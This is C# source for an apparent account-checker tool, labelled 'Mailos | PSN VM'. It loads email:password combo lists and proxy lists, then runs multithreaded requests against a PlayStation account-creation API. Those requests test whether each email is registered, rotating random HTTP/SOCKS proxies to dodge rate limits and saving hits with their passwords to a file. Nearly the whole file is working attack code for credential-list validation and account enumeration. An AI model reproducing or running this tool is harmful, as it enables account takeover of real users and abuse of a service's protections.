using JawBrute;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Template;
using yoboi_legend;

namespace Ebay_Checker
{
    class psnvm
    {
        [STAThread]
        public static void psnstartt()
        {
            Prsc.checkpsnvm();
            Export.Initialize();
            Console.Title = "Mailos | PSN VM";
        fuck:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                Threads:", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("               > ", Color.SpringGreen);
            try
            {
                Variables.threads = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.WriteLine("Error Parsing Integor...");
                goto fuck;
            }
        fuckme:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [1] HTTP", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [2] SOCKS4", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [3] SOCKS5", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("          > ", Color.SpringGreen);
            string c = Console.ReadLine();
            if (c == "1")
            {
                Variables.proxyprotocol = "HTTP";
            }
            else if (c == "2")
            {
                Variables.proxyprotocol = "SOCKS4";
            }
            else if (c == "3")
            {
                Variables.proxyprotocol = "SOCKS5";
            }
            else
            {
                goto fuckme;
            }
            loadCombos();
        }
        public static void loadCombos()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Combos";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.combos = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.combototal++;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            loadProxies();
        }
        public static void loadProxies()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Proxies";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.proxies1 = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.proxytotal++;
                            }

                        }
                    }
                }
            }
            catch
            {

            }
            start();
        }
        public static void start()
        {
            Console.Clear();
            ASCII.ASCIII();
            try
            {

                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        Variables.cpm = Variables.cpm_aux;
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - PSN VM] | Registered: " + Variables.hit + " | Invalid: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });

                for (int i = 1; i <= Variables.threads; i++)
                {
                    new Thread(new ThreadStart(CheckAccount)).Start();
                }
            }
            catch
            {

            }
        }
        public static void CheckAccount()
        {
        stat:
            for (; ; )
            {

                while (true)
                {
                    //RANDOM PROXY EVERY REQ
                    string proxy = "";
                    Random r = new Random();
                    proxy = Variables.proxies1[r.Next(Variables.proxies1.Count)];

                    try
                    {

                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            //SPLITTIN COMBOS
                            if (Variables.comboindex >= Variables.combos.Count<string>())
                            {
                                break;
                            }
                            Interlocked.Increment(ref Variables.comboindex);
                            string[] s = Variables.combos[Variables.comboindex].Split(new char[]
                            {
                            ':'
                            });
                            //s[0] - Email  | s[1] - Password
                            try
                            {
                                //PROXY HANDEL
                                if (Variables.proxyprotocol == "HTTP")
                                {
                                    httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS4")
                                {
                                    httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS5")
                                {
                                    httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                                }
                                //REQUESTS - YOU CAN REPLACE WITH COMPILER CODE HERE, USE UR BRAIN PLEASE THANKS`
                                httpRequest.IgnoreProtocolErrors = true;
                                httpRequest.AllowAutoRedirect = false;
                                httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                                new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                                httpRequest.AllowAutoRedirect = false;
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0");
                                httpRequest.AddHeader("Pragma", "no-cache");
                                httpRequest.AddHeader("Accept", "*/*");
                                httpRequest.AddHeader("Referer", "https://id.sonyentertainmentnetwork.com/create_account/?entry=%2Fcreate_account&tp_psn=true&ui=pr&client_id=" + "7cd4e9b5-9763-4138-91ba-7bf7c0a7a020" + "&redirect_uri=https://secure.eu.playstation.com/psnauth/PSNOAUTHResponse/pdc/&request_locale=en_US&response_type=code&scope=psn:s2s&service_entity=urn:service-entity:psn&service_logo=ps");

                                var res0 = httpRequest.Post("https://accounts.api.playstation.com/api/v1/accounts/onlineIds", "{\"onlineId\":\"" + s[0] + "\",\"reserveIfAvailable\":true}", "application/json");
                                string text0 = res0.ToString();

                                if (text0.Contains("Account with this online id already exists") || text0.Contains("\"code\":\"3101\""))
                                {
                                    Variables.hit++;
                                    {
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        Variables.hit++;
                                        Console.WriteLine("[Registered] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/PsnValidMail_hits", s[0] + ":" + s[1]);
                                }
                                else if (text0.Contains("\"expirationDate\":\"") || text0.Contains("string is too long"))
                                {
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                    Variables.bad++;
                                    break;
                                }
                                else if (text0.Contains("Access Denied"))
                                {
                                    break;
                                }
                                else
                                {
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                    Variables.bad++;
                                }
                            }







                            catch (Exception ex)
                            {
                                Variables.error++;

                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Variables.error++;
                    }
                }
            }
        }
    }
}